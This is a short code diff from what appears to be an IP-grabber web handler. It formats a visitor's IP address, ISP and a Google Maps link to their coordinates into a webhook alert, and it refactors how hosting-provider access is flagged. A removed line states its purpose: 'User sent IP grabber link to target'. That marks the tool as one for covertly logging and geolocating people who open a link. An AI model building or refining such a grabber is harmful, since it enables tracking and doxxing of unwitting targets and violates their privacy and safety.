@@ -76,15 +76,17 @@ export default async function handler(req, res) {
             ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
             : "Not available";
 
+        const isHosting = ipDetails.hosting ? "Yes" : "No";
+
         // Prepare different messages based on hosting status
-        const message = ipDetails.hosting
+        const message = isHosting === "Yes" 
             ? {
                 username: "Hosting Detection Logger",
-                content: "⚠️ **Alert:** User sent IP grabber link to target.",
+                content: `⚠️ **Alert:** Access from a hosting provider detected!`,
                 embeds: [
                     {
                         title: "Hosting Access Detected",
-                        color: 0xFF0000,
+                        color: 0xFF0000, // Red color to indicate alert
                         fields: [
                             { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                             { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
